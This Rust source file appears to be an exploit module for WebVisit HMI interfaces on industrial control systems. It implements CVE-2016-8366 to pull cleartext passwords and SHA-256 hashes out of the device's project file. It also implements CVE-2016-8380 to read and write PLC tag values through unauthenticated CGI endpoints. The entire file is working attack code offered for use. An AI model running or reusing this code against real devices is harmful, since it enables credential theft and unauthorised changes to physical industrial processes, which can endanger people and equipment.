use anyhow::Result;
use std::time::Duration;

#[derive(Debug, Clone)]
pub struct PasswordEntry {
    pub user_level: String,
    pub password: Option<String>,
    pub hash: Option<String>,
    pub entry_type: String,
}

#[derive(Debug, Clone)]
pub struct TagEntry {
    pub name: String,
    pub value: Option<String>,
}

/// Retrieve passwords from WebVisit HMI (CVE-2016-8366).
pub fn retrieve_passwords(target_ip: &str) -> Result<Vec<PasswordEntry>> {
    let agent = ureq::AgentBuilder::new()
        .timeout_connect(Duration::from_secs(5))
        .timeout_read(Duration::from_secs(5))
        .build();

    let resp = match agent.get(&format!("http://{target_ip}")).call() {
        Ok(r) => r.into_string()?,
        Err(e) => anyhow::bail!("Cannot connect to {target_ip}: {e}"),
    };

    let main_teq = resp
        .lines()
        .find(|l| l.contains("MainTEQName"))
        .and_then(|l| {
            let start = l.find(r#"VALUE=""#)? + 7;
            let end = l[start..].find('"')? + start;
            Some(l[start..end].to_string())
        });

    let main_teq = match main_teq {
        Some(t) if !t.is_empty() => t,
        _ => anyhow::bail!("No MainTEQ found"),
    };

    let teq_body = match agent
        .get(&format!("http://{target_ip}/{main_teq}"))
        .call()
    {
        Ok(r) => {
            use std::io::Read;
            let mut buf = Vec::new();
            r.into_reader().read_to_end(&mut buf)?;
            buf
        }
        Err(e) => anyhow::bail!("Cannot fetch {main_teq}: {e}"),
    };

    let mut results = Vec::new();
    let cleartext_marker: &[u8] = &[0x00, 0x03, 0x00, 0x03, 0x01, 0x03, 0x01, 0x06, 0x83, 0x00];
    let hash_marker: &[u8] = &[
        0x00, 0x03, 0x00, 0x03, 0x01, 0x03, 0x0b, 0x06, 0x83, 0x00, 0x40,
    ];
    let split_marker = b"userLevel\x05\x06\x03\x00\x01";

    for chunk in teq_body.split(|_| false) {
        let _ = chunk; // unused
    }

    // Manual split on the marker
    let chunks = split_bytes(&teq_body, split_marker);
    for chunk in chunks.iter().skip(1) {
        let user_level = chunk
            .first()
            .map(|b| (*b as char).to_string())
            .unwrap_or_default();

        if let Some(pos) = find_subsequence(chunk, cleartext_marker) {
            let after = &chunk[pos + cleartext_marker.len()..];
            if !after.is_empty() {
                let pass_len = after[0] as usize;
                if after.len() > pass_len {
                    let password =
                        String::from_utf8_lossy(&after[1..1 + pass_len]).to_string();
                    println!("Password for user level {user_level}: {password}");
                    results.push(PasswordEntry {
                        user_level,
                        password: Some(password),
                        hash: None,
                        entry_type: "cleartext".into(),
                    });
                }
            }
        } else if let Some(pos) = find_subsequence(chunk, hash_marker) {
            let after = &chunk[pos + hash_marker.len()..];
            if after.len() >= 64 {
                let hash_val = String::from_utf8_lossy(&after[..64]).to_string();
                println!("Hash for user level {user_level}: {hash_val}");
                results.push(PasswordEntry {
                    user_level,
                    password: None,
                    hash: Some(hash_val),
                    entry_type: "sha256".into(),
                });
            }
        }
    }

    if results.is_empty() {
        println!("No passwords or hashes found (patched?).");
    }
    Ok(results)
}

/// Retrieve the tag list from a WebVisit HMI.
pub fn get_tags(target_ip: &str) -> Result<(String, Vec<String>)> {
    let agent = ureq::AgentBuilder::new()
        .timeout_connect(Duration::from_secs(5))
        .timeout_read(Duration::from_secs(5))
        .build();

    let resp = match agent.get(&format!("http://{target_ip}")).call() {
        Ok(r) => r.into_string()?,
        Err(e) => anyhow::bail!("Cannot connect to {target_ip}: {e}"),
    };

    let project = resp
        .lines()
        .find(|l| l.contains("ProjectName"))
        .and_then(|l| {
            let start = l.find(r#"VALUE=""#)? + 7;
            let end = l[start..].find('"')? + start;
            Some(l[start..end].to_string())
        });

    let project = match project {
        Some(p) if !p.is_empty() => p,
        _ => anyhow::bail!("No ProjectName found"),
    };

    println!("Found project: {project}");

    let tcr_body = match agent
        .get(&format!("http://{target_ip}/{project}.tcr"))
        .call()
    {
        Ok(r) => r.into_string()?,
        Err(e) => anyhow::bail!("Cannot fetch {project}.tcr: {e}"),
    };

    let mut tags = Vec::new();
    let mut found_header = false;

    for line in tcr_body.lines() {
        if line.starts_with("#!-- N =") {
            found_header = true;
            let count = line.split('=').nth(1).map(str::trim).unwrap_or("?");
            println!("Found {count} tags:");
        }
        if found_header && !line.contains('#') && line.contains(';') {
            let tag = line.split(';').next().unwrap_or("").trim().to_string();
            if !tag.is_empty() {
                tags.push(tag);
            }
        }
    }

    Ok((project, tags))
}

/// Read current values for a list of tags (CVE-2016-8380).
pub fn read_tag_values(target_ip: &str, tags: &[String]) -> Result<Vec<(String, String)>> {
    let mut body = format!(
        "<body><item_list_size>{}</item_list_size><item_list>",
        tags.len()
    );
    for tag in tags {
        // XML-escape tag names from PLC file to prevent injection
        let escaped = tag
            .replace('&', "&amp;")
            .replace('<', "&lt;")
            .replace('>', "&gt;")
            .replace('"', "&quot;");
        body.push_str(&format!("<i><n>{escaped}</n></i>"));
    }
    body.push_str("</item_list></body>");

    let url = format!("http://{target_ip}/cgi-bin/ILRReadValues.exe");
    let agent = ureq::AgentBuilder::new()
        .timeout_read(Duration::from_secs(10))
        .build();

    let resp_body = agent
        .post(&url)
        .set("Content-Type", "text/xml")
        .send_string(&body)?
        .into_string()?;

    let mut values = Vec::new();
    for item in resp_body.split("<i>") {
        if !item.contains("</i>") {
            continue;
        }
        let name = extract_tag(item, "<n>", "</n>").unwrap_or_default();
        let value = extract_tag(item, "<v>", "</v>").unwrap_or_default();
        if !name.is_empty() {
            values.push((name, value));
        }
    }
    Ok(values)
}

/// Write a tag value (CVE-2016-8380).
pub fn write_tag_value(target_ip: &str, tag_name: &str, value: &str) -> Result<bool> {
    if target_ip.parse::<std::net::Ipv4Addr>().is_err() {
        anyhow::bail!("Invalid target IP: {target_ip}");
    }
    let enc_name = percent_encode(tag_name);
    let enc_value = percent_encode(value);
    let url = format!("http://{target_ip}/cgi-bin/writeVal.exe?{enc_name}+{enc_value}");
    let agent = ureq::AgentBuilder::new()
        .timeout_read(Duration::from_secs(5))
        .build();

    match agent.get(&url).call() {
        Ok(_) => {
            println!("Wrote {tag_name} = {value}");
            Ok(true)
        }
        Err(e) => {
            println!("Failed to write tag: {e}");
            Ok(false)
        }
    }
}

fn percent_encode(s: &str) -> String {
    let mut out = String::new();
    for byte in s.bytes() {
        match byte {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(byte as char);
            }
            other => out.push_str(&format!("%{other:02X}")),
        }
    }
    out
}

fn extract_tag(s: &str, open: &str, close: &str) -> Option<String> {
    let start = s.find(open)? + open.len();
    let end = s[start..].find(close)? + start;
    Some(s[start..end].to_string())
}

fn split_bytes<'a>(data: &'a [u8], sep: &[u8]) -> Vec<&'a [u8]> {
    let mut parts = Vec::new();
    let mut start = 0;
    while start <= data.len() {
        match find_subsequence(&data[start..], sep) {
            Some(pos) => {
                parts.push(&data[start..start + pos]);
                start += pos + sep.len();
            }
            None => {
                parts.push(&data[start..]);
                break;
            }
        }
    }
    parts
}

fn find_subsequence(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    haystack
        .windows(needle.len())
        .position(|window| window == needle)
}
